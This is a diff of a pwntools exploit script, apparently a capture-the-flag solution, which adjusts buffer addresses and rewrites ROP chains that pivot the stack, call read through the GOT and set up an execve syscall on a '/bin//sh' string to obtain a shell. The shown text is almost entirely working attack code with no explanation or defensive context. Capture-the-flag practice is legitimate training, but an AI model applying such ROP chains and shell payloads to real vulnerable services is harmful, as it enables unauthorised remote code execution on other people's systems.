@@ -22,7 +22,7 @@ r.recvuntil(':')
 r.interactive()
 buf1_addr = 0x0601b80
 buf2_addr = 0x0601d00
-buf3_addr = 0x0601e30
+buf3_addr = 0x0601e00
 main_53_addr = 0x40062b     #lea    rax,[rbp-0x20]
 main_70_addr = 0x40063c     #call   0x4004c0 <read@plt>
 leave_ret = 0x400646        
@@ -51,9 +51,9 @@ rop4 = flat([read_plt,0x4006aa,0,buf2_addr+0x48,buf1_addr+0x80,0xa0])
 r.send(rop4)
 rop5 = flat([buf2_addr,0,0x400690,buf2_addr+0x50,main_70_addr,read_plt])
 r.send(rop5)
-rop6 = '/bin//sh' + '\0'*8 + flat([0x4006aa,0,0,buf1_addr+0x88,0,0,buf2_addr,0x400690,0x4006aa,0,buf3_addr-0x8,buf1_addr+0x80,0x88,buf3_addr,0,0x400690,0xdeadbeef,0xfaceb00c])
+rop6 = '/bin//sh' + '\0'*8 + flat([0x4006aa,0,0,buf1_addr+0x88,0,0,buf2_addr,0x400690,0x4006aa,0,buf3_addr-0x8,buf1_addr+0x80,0xc0,buf3_addr,0,0x400690,0xdeadbeef,0xfaceb00c])
 r.send(rop6)
-rop7 = flat([0x4006aa,0,buf3_addr+0x38,buf1_addr+0x80,1,read_got,0,0x400690,0x4006aa,0,buf2_addr+0x8,buf1_addr+0x88,0x3b,buf1_addr,0,0x4006aa,0xdeadbeef])
+rop7 = flat([0x4006aa,0,buf3_addr+0x38,buf1_addr+0x80,1,read_got,0,0x400690,0x4006aa,0,1,buf1_addr+0x88,0x3b,buf1_addr,0,0x400690,0x123,1,buf2_addr+0x8,0x12,0x13,0x14,0x15,leave_ret])
 r.send(rop7)
 r.send('\x2e')
 r.send('x'*0x3b)
